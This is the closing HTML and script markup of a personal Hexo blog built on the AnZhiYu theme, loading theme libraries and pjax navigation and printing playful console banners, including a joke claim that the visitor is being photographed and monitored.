class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 MooSe 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="click-show-text" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="MISC,WEB,PWN,REVERSE,CRYPTO,PPC,STRGA" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>